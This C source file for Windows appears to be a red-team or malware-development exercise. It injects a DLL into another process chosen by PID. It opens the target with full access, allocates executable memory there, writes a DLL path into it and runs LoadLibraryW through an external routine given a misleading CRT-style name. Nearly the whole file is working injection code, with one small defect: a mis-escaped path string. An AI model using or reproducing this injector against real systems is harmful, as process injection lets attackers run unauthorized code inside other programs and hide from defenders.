#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

extern void _DllMainCRTStartup(HANDLE targetHandle, LPVOID rBuffer, LPTHREAD_START_ROUTINE loadLibraryAddress);

    /***      VARIABLES    ***/
    HANDLE hProcess;
    DWORD PID; 
    LPVOID rBuffer; 
    HMODULE hKernel32; 
    wchar_t dllPath[MAX_PATH] = L"C:\\path\\to\your-dll.dll";
    size_t dllSize = sizeof(dllPath);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warn("Usage: .\\program.exe <PID>");
        return -1;
    }
    PID = atoi(argv[1]);
    info("Target Process: %d", PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        warn("Failed to Open Target Process! Error Code: 0x%lx", GetLastError());
        goto CLEAN;
    } 
    okay("Opened Target Process!");

    info("Getting handle to kernel32.dll....");

    hKernel32 = GetModuleHandleW(L"kernel32");
    if (hKernel32 == NULL) {
        warn("Failed to get a handle to kernel32.dll! Error Code: 0x%lx\n", GetLastError());
        goto CLEAN;
    }
    okay("Got a handle to kernel32.dll! Address of kernel32.dll: 0x%p", hKernel32);

    info("Getting address of LoadLibraryW...");
    LPTHREAD_START_ROUTINE wLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (wLoadLibrary == NULL) {
        warn("Failed to get a address for LoadLibraryW! Error Code: 0x%lx", GetLastError());
        goto CLEAN;
    }
    okay("Got a address for LoadLibraryW! Address: 0x%p", wLoadLibrary);

    rBuffer = VirtualAllocEx(hProcess, NULL, dllSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (rBuffer == NULL) {
        warn("Failed to Allocated Memory for DLL! Error Code: 0x%lx", GetLastError());
        goto CLEAN;
    }
    okay("Allocated Memory (Mem-Size: %zu-byte) for DLL Path! Address: 0x%p", dllSize, rBuffer);

    if(!(WriteProcessMemory(hProcess, rBuffer, dllPath, dllSize, 0))) {
        warn("Failed to write dllPath to Allocated Memory Error Code: 0x%lx", GetLastError());
        goto CLEAN;
    }
    okay("Wrote dllPath to Allocated Memory!");

    _DllMainCRTStartup(hProcess, rBuffer, wLoadLibrary);

    okay("Yupaaaa, Thread finished execution!");
    goto CLEAN;


CLEAN:
    if (hProcess) {
        info("Closing handle to process!");
        CloseHandle(hProcess);
    }
    return 0;
}
